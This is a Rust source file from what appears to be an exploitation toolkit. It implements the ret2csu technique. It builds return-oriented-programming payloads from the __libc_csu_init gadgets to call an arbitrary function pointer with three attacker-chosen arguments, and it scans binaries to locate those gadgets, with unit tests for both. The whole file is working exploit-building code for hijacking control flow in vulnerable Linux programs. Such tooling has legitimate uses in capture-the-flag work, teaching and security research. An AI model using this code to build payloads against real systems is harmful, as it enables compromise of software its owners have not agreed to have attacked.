//! ret2csu: reuse the universal gadget in `__libc_csu_init` to call any function pointer with three
//! controlled arguments, even when the binary has no `pop rdi/rsi/rdx` gadgets. The standard gcc
//! `__libc_csu_init` tail is:
//!
//! ```text
//!   pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret      ; "pop6" gadget
//!   mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]   ; "mov/call" gadget
//!   ... add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
//! ```
//!
//! Setting `rbx=0, rbp=1` makes the trailing `cmp rbx, rbp` exit the loop after one call, which
//! calls `[r12]` with `edi=r13, rsi=r14, rdx=r15`. Note `edi` is 32-bit, so the first argument is
//! truncated to 32 bits, and `r12` must point at memory holding the target address (e.g. a GOT slot).

use orress_arch::{Flow, Isa, decode};

/// Builds a ret2csu chain calling `*call_ptr` with `args` (arg0 truncated to 32 bits), returning to
/// `ret_after`. `pop6` and `mov_call` are the two gadget addresses (see [`find_csu`]).
pub fn chain(pop6: u64, mov_call: u64, call_ptr: u64, args: [u64; 3], ret_after: u64) -> Vec<u8> {
    let mut out = Vec::new();
    let mut push = |v: u64| out.extend_from_slice(&v.to_le_bytes());
    push(pop6);
    push(0); // rbx = 0
    push(1); // rbp = 1
    push(call_ptr); // r12
    push(args[0]); // r13 -> edi
    push(args[1]); // r14 -> rsi
    push(args[2]); // r15 -> rdx
    push(mov_call);
    push(0); // skipped by `add rsp, 8`
    for _ in 0..6 {
        push(0); // the trailing pop rbx..r15
    }
    push(ret_after);
    out
}

/// Finds the `__libc_csu_init` "pop6" and "mov/call" gadgets in `exec` (each `(base, bytes)`).
pub fn find_csu(exec: &[(u64, &[u8])], isa: Isa) -> Option<(u64, u64)> {
    let pop6 = find_sequence(
        exec,
        isa,
        &[
            "pop rbx", "pop rbp", "pop r12", "pop r13", "pop r14", "pop r15",
        ],
        |insn| matches!(insn.flow, Flow::Return),
    )?;
    let mov_call = find_sequence(
        exec,
        isa,
        &["mov rdx,r15", "mov rsi,r14", "mov edi,r13d"],
        |insn| insn.mnemonic == "call" && insn.text().contains("r12+rbx"),
    )?;
    Some((pop6, mov_call))
}

/// Finds the address of the first instruction of a run matching `prefix` (exact instruction texts)
/// followed by an instruction for which `last` holds.
fn find_sequence(
    exec: &[(u64, &[u8])],
    isa: Isa,
    prefix: &[&str],
    last: impl Fn(&orress_arch::Insn) -> bool,
) -> Option<u64> {
    for &(base, bytes) in exec {
        let mut off = 0usize;
        while off < bytes.len() {
            if let Some(addr) = matches_here(bytes, base, off, isa, prefix, &last) {
                return Some(addr);
            }
            // advance by one decoded instruction (fall back to 1 byte)
            let step = decode(isa, &bytes[off..(off + 15).min(bytes.len())], base + off as u64)
                .map_or(1, |i| usize::from(i.len).max(1));
            off += step;
        }
    }
    None
}

fn matches_here(
    bytes: &[u8],
    base: u64,
    start: usize,
    isa: Isa,
    prefix: &[&str],
    last: &impl Fn(&orress_arch::Insn) -> bool,
) -> Option<u64> {
    let mut off = start;
    for want in prefix {
        let insn = decode(isa, &bytes[off..(off + 15).min(bytes.len())], base + off as u64)?;
        if insn.len == 0 || &insn.text() != want {
            return None;
        }
        off += usize::from(insn.len);
    }
    let insn = decode(isa, &bytes[off..(off + 15).min(bytes.len())], base + off as u64)?;
    if last(&insn) {
        Some(base + start as u64)
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chain_layout() {
        let c = chain(0x401000, 0x400fe0, 0x404018, [0x1, 0x2, 0x3], 0x401234);
        assert_eq!(c.len(), 16 * 8);
        let q = |i: usize| u64::from_le_bytes(c[i * 8..i * 8 + 8].try_into().unwrap());
        assert_eq!(q(0), 0x401000); // pop6
        assert_eq!(q(1), 0); // rbx
        assert_eq!(q(2), 1); // rbp
        assert_eq!(q(3), 0x404018); // r12 = call ptr
        assert_eq!(q(4), 0x1); // r13 -> edi
        assert_eq!(q(7), 0x400fe0); // mov/call gadget
        assert_eq!(q(15), 0x401234); // ret_after
    }

    #[test]
    fn finds_the_csu_gadgets() {
        let base = 0x401000u64;
        let bytes = orress_asm::assemble(
            "pop rbx\npop rbp\npop r12\npop r13\npop r14\npop r15\nret\n\
             mov rdx, r15\nmov rsi, r14\nmov edi, r13d\ncall qword ptr [r12+rbx*8]",
            orress_asm::Arch::X64,
            base,
        )
        .unwrap()
        .bytes;
        let (pop6, mov_call) = find_csu(&[(base, &bytes)], Isa::X64).expect("found");
        assert_eq!(pop6, base);
        // pop rbx/rbp are 1 byte, pop r12..r15 need a REX prefix (2 bytes each), ret 1 byte = 11.
        assert_eq!(mov_call, base + 11);
    }
}
